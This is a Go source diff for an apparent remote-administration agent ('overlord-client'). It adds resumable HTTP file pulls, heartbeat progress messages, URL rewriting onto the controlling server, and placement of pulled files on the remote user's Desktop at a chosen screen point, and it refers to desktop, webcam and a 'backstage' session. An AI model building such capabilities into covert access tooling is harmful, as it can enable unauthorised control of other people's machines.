@@ -26,6 +26,7 @@ import (
 	"time"
 	"unicode/utf8"
 
+	"overlord-client/cmd/agent/capture"
 	agentRuntime "overlord-client/cmd/agent/runtime"
 	agentTLS "overlord-client/cmd/agent/tlsconfig"
 	"overlord-client/cmd/agent/wire"
@@ -807,13 +808,14 @@ func HandleFileUploadHTTP(ctx context.Context, env *agentRuntime.Env, cmdID stri
 			SpeedBytesPerSecond: windowedSpeed,
 			Message:             message,
 		}
-		if err := wire.WriteMsg(ctx, env.Conn, progress); err != nil {
+		// Control path: must not wait behind desktop/webcam media frames.
+		if err := wire.WriteControlMsg(ctx, env.Conn, progress); err != nil {
 			log.Printf("file_upload_http progress send failed: %v", err)
 		}
 	}
 	failResult := func(message string, resolvedURL string) error {
 		sendProgress("failed", progressAttempt, progressTransferred, message, resolvedURL, true)
-		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: message})
+		return wire.WriteControlMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: message})
 	}
 	if err := ctx.Err(); err != nil {
 		return failResult("cancelled", "")
@@ -827,7 +829,7 @@ func HandleFileUploadHTTP(ctx context.Context, env *agentRuntime.Env, cmdID stri
 
 	parsed, err := url.Parse(resolvedURL)
 	if err != nil || parsed == nil || parsed.Host == "" {
-		return failResult("invalid upload url", resolvedURL)
+		return failResult(fmt.Sprintf("invalid upload url (raw=%q resolved=%q)", sourceURL, resolvedURL), resolvedURL)
 	}
 	if parsed.Scheme != "https" && parsed.Scheme != "http" {
 		return failResult("unsupported upload url scheme", resolvedURL)
@@ -882,8 +884,26 @@ func HandleFileUploadHTTP(ctx context.Context, env *agentRuntime.Env, cmdID stri
 
 		attemptCtx, attemptCancel := context.WithCancel(ctx)
 
+		// Heartbeat while waiting on headers so server idle watchdogs stay alive.
+		requestHeartbeatDone := make(chan struct{})
+		go func(att int, off int64) {
+			ticker := time.NewTicker(12 * time.Second)
+			defer ticker.Stop()
+			for {
+				select {
+				case <-requestHeartbeatDone:
+					return
+				case <-attemptCtx.Done():
+					return
+				case <-ticker.C:
+					sendProgress("requesting", att, off, fmt.Sprintf("Still requesting upload payload (attempt %d)", att), resolvedURL, true)
+				}
+			}
+		}(attempt, offset)
+
 		req, reqErr := http.NewRequestWithContext(attemptCtx, http.MethodGet, parsed.String(), nil)
 		if reqErr != nil {
+			close(requestHeartbeatDone)
 			attemptCancel()
 			lastErr = reqErr
 			break
@@ -899,12 +919,14 @@ func HandleFileUploadHTTP(ctx context.Context, env *agentRuntime.Env, cmdID stri
 		}
 
 		resp, doErr := client.Do(req)
+		close(requestHeartbeatDone)
 		if doErr != nil {
 			attemptCancel()
 			lastErr = doErr
 			if ctx.Err() != nil {
 				break
 			}
+			sendProgress("retrying", attempt, offset, fmt.Sprintf("Request failed: %v", doErr), resolvedURL, true)
 			sleepBackoff(ctx, backoff)
 			backoff = nextBackoff(backoff)
 			continue
@@ -961,7 +983,9 @@ func HandleFileUploadHTTP(ctx context.Context, env *agentRuntime.Env, cmdID stri
 		watchdogDone := make(chan struct{})
 		go func() {
 			ticker := time.NewTicker(httpUploadStallTimeout / 3)
+			heartbeat := time.NewTicker(12 * time.Second)
 			defer ticker.Stop()
+			defer heartbeat.Stop()
 			last := pr.bytes.Load()
 			lastChange := time.Now()
 			for {
@@ -970,6 +994,16 @@ func HandleFileUploadHTTP(ctx context.Context, env *agentRuntime.Env, cmdID stri
 					return
 				case <-attemptCtx.Done():
 					return
+				case <-heartbeat.C:
+					cur := offset + pr.bytes.Load()
+					sendProgress(
+						"transferring",
+						attempt,
+						cur,
+						fmt.Sprintf("Transfer still active at %d of %d bytes", cur, expectedSize),
+						resolvedURL,
+						true,
+					)
 				case <-ticker.C:
 					cur := pr.bytes.Load()
 					if cur != last {
@@ -990,9 +1024,25 @@ func HandleFileUploadHTTP(ctx context.Context, env *agentRuntime.Env, cmdID stri
 		_ = resp.Body.Close()
 		attemptCancel()
 
+		curWritten := offset + n
+		if expectedSize > 0 && curWritten < expectedSize {
+			// Clean EOF with a short body must resume via Range, not exit the loop.
+			if copyErr == nil {
+				lastErr = fmt.Errorf("short upload body: got %d, expected %d", curWritten, expectedSize)
+			} else {
+				lastErr = copyErr
+			}
+			if ctx.Err() != nil {
+				break
+			}
+			sendProgress("retrying", attempt, curWritten, lastErr.Error(), resolvedURL, true)
+			sleepBackoff(ctx, backoff)
+			backoff = nextBackoff(backoff)
+			continue
+		}
+
 		if copyErr == nil {
 			lastErr = nil
-			_ = n
 			break
 		}
 
@@ -1035,7 +1085,90 @@ func HandleFileUploadHTTP(ctx context.Context, env *agentRuntime.Env, cmdID stri
 	}
 
 	sendProgress("complete", progressAttempt, written, fmt.Sprintf("Upload complete: %d bytes written", written), resolvedURL, true)
-	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	return wire.WriteControlMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+}
+
+func desktopUploadPath(fileName string) (string, error) {
+	fileName = strings.TrimSpace(fileName)
+	if fileName == "" || fileName == "." || fileName == ".." || filepath.Base(fileName) != fileName || strings.ContainsAny(fileName, `/\\`) {
+		return "", errors.New("invalid desktop upload filename")
+	}
+	if strings.IndexFunc(fileName, func(r rune) bool { return r < 0x20 || r == 0x7f }) >= 0 {
+		return "", errors.New("invalid desktop upload filename")
+	}
+	homeDir, err := os.UserHomeDir()
+	if err != nil || strings.TrimSpace(homeDir) == "" {
+		return "", errors.New("unable to resolve the current user's home directory")
+	}
+	return filepath.Join(homeDir, "Desktop", fileName), nil
+}
+
+func desktopUploadTarget(fileName string, display int, x, y int32, hasDropPoint bool) (string, bool, int32, int32, error) {
+	destPath, err := desktopUploadPath(fileName)
+	if err != nil {
+		return "", false, 0, 0, err
+	}
+	if !hasDropPoint {
+		return destPath, false, 0, 0, nil
+	}
+	absX, absY := resolveDesktopPoint(display, x, y)
+	hit := capture.ResolveShellDropHit(absX, absY)
+	resolved, placeOnDesktop := desktopUploadTargetFromHit(destPath, fileName, hit)
+	return resolved, placeOnDesktop, absX, absY, nil
+}
+
+func desktopUploadTargetFromHit(destPath, fileName string, hit capture.ShellDropHit) (string, bool) {
+	directory := strings.TrimSpace(hit.Directory)
+	if directory == "" {
+		return destPath, hit.Desktop
+	}
+	if hit.ItemName != "" {
+		hovered := filepath.Join(directory, hit.ItemName)
+		if info, statErr := os.Stat(hovered); statErr == nil && info.IsDir() {
+			directory = hovered
+		}
+	}
+	return filepath.Join(directory, fileName), hit.Desktop && directory == filepath.Dir(destPath)
+}
+
+func HandleFileUploadDesktop(ctx context.Context, env *agentRuntime.Env, cmdID string, fileName string, sourceURL string, expectedSize int64, display int, x, y int32, hasDropPoint bool) error {
+	if remoteDesktopDropBlocked(env) {
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
+			Type:      "command_result",
+			CommandID: cmdID,
+			OK:        false,
+			Message:   "remote desktop file drop is unavailable while backstage mode is active",
+		})
+	}
+	destPath, placeOnDesktop, absX, absY, err := desktopUploadTarget(fileName, display, x, y, hasDropPoint)
+	if err != nil {
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+	}
+	before, _ := os.Stat(destPath)
+	resultErr := HandleFileUploadHTTP(ctx, env, cmdID, destPath, sourceURL, expectedSize)
+	if placeOnDesktop {
+		after, statErr := os.Stat(destPath)
+		if statErr == nil && (before == nil || after.ModTime() != before.ModTime() || after.Size() != before.Size()) {
+			positionDesktopUpload(fileName, absX, absY)
+		}
+	}
+	return resultErr
+}
+
+func remoteDesktopDropBlocked(env *agentRuntime.Env) bool {
+	if env == nil {
+		return false
+	}
+	env.BackstageMu.Lock()
+	backstageActive := env.BackstageCancel != nil
+	env.BackstageMu.Unlock()
+	if backstageActive {
+		return true
+	}
+	env.VirtualMu.Lock()
+	virtualBackstageActive := env.VirtualCancel != nil
+	env.VirtualMu.Unlock()
+	return virtualBackstageActive
 }
 
 func sleepBackoff(ctx context.Context, d time.Duration) {
@@ -1063,7 +1196,69 @@ func resolveUploadPullURL(env *agentRuntime.Env, raw string) (string, error) {
 
 	parsed, err := url.Parse(trimmed)
 	if err != nil {
-		return "", fmt.Errorf("invalid upload url: %w", err)
+		return "", fmt.Errorf("invalid upload url %q: %w", trimmed, err)
+	}
+
+	isPullPath := strings.HasPrefix(parsed.Path, "/api/file/upload/pull/") ||
+		(!parsed.IsAbs() && strings.HasPrefix(strings.TrimPrefix(parsed.Path, "/"), "api/file/upload/pull/"))
+
+	// Always rewrite upload-pull paths onto the agent's live server URL so the
+	// transfer uses the same host the websocket already reached. Do this before
+	// absolute-URL plaintext checks so http:// public origins still rewrite to wss→https.
+	if isPullPath {
+		if len(env.Cfg.ServerURLs) == 0 {
+			if parsed.IsAbs() {
+				scheme := strings.ToLower(parsed.Scheme)
+				if scheme == "http" && !env.Cfg.TLSInsecureSkipVerify {
+					return "", errors.New("plaintext file transfers are disabled; use https")
+				}
+				if scheme != "http" && scheme != "https" {
+					return "", fmt.Errorf("unsupported upload url scheme: %s", parsed.Scheme)
+				}
+				return parsed.String(), nil
+			}
+			return "", errors.New("no server url configured for upload pull")
+		}
+
+		idx := env.Cfg.ServerIndex
+		if idx < 0 || idx >= len(env.Cfg.ServerURLs) {
+			idx = 0
+		}
+		server, err := url.Parse(env.Cfg.ServerURLs[idx])
+		if err != nil {
+			return "", fmt.Errorf("invalid agent server url: %w", err)
+		}
+		switch strings.ToLower(server.Scheme) {
+		case "wss":
+			server.Scheme = "https"
+		case "ws":
+			if !env.Cfg.TLSInsecureSkipVerify {
+				return "", errors.New("plaintext file transfers are disabled; use wss")
+			}
+			server.Scheme = "http"
+		case "https":
+		case "http":
+			if !env.Cfg.TLSInsecureSkipVerify {
+				return "", errors.New("plaintext file transfers are disabled; use https")
+			}
+		default:
+			return "", fmt.Errorf("unsupported agent server scheme: %s", server.Scheme)
+		}
+
+		path := parsed.Path
+		if path == "" {
+			return "", errors.New("missing upload pull path")
+		}
+		if !strings.HasPrefix(path, "/") {
+			path = "/" + path
+		}
+		server.Path = path
+		server.RawQuery = parsed.RawQuery
+		server.Fragment = ""
+		if server.Host == "" {
+			return "", fmt.Errorf("invalid upload url (raw=%q resolved=%q): missing host", trimmed, server.String())
+		}
+		return server.String(), nil
 	}
 
 	if parsed.IsAbs() {
@@ -1074,53 +1269,13 @@ func resolveUploadPullURL(env *agentRuntime.Env, raw string) (string, error) {
 		if scheme == "http" && !env.Cfg.TLSInsecureSkipVerify {
 			return "", errors.New("plaintext file transfers are disabled; use https")
 		}
-		if !strings.HasPrefix(parsed.Path, "/api/file/upload/pull/") {
-			return parsed.String(), nil
+		if parsed.Host == "" {
+			return "", fmt.Errorf("invalid upload url (raw=%q): missing host", trimmed)
 		}
+		return parsed.String(), nil
 	}
 
-	if len(env.Cfg.ServerURLs) == 0 {
-		if parsed.IsAbs() {
-			return parsed.String(), nil
-		}
-		return "", errors.New("no server url configured for upload pull")
-	}
-
-	idx := env.Cfg.ServerIndex
-	if idx < 0 || idx >= len(env.Cfg.ServerURLs) {
-		idx = 0
-	}
-	server, err := url.Parse(env.Cfg.ServerURLs[idx])
-	if err != nil {
-		return "", fmt.Errorf("invalid agent server url: %w", err)
-	}
-	switch strings.ToLower(server.Scheme) {
-	case "wss":
-		server.Scheme = "https"
-	case "ws":
-		if !env.Cfg.TLSInsecureSkipVerify {
-			return "", errors.New("plaintext file transfers are disabled; use wss")
-		}
-		server.Scheme = "http"
-	case "https":
-	case "http":
-		if !env.Cfg.TLSInsecureSkipVerify {
-			return "", errors.New("plaintext file transfers are disabled; use https")
-		}
-	default:
-		return "", fmt.Errorf("unsupported agent server scheme: %s", server.Scheme)
-	}
-
-	if parsed.Path == "" {
-		return "", errors.New("missing upload pull path")
-	}
-	if !strings.HasPrefix(parsed.Path, "/") {
-		parsed.Path = "/" + parsed.Path
-	}
-	server.Path = parsed.Path
-	server.RawQuery = parsed.RawQuery
-	server.Fragment = ""
-	return server.String(), nil
+	return "", fmt.Errorf("invalid upload url (raw=%q): missing host", trimmed)
 }
 
 func HandleFileDelete(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
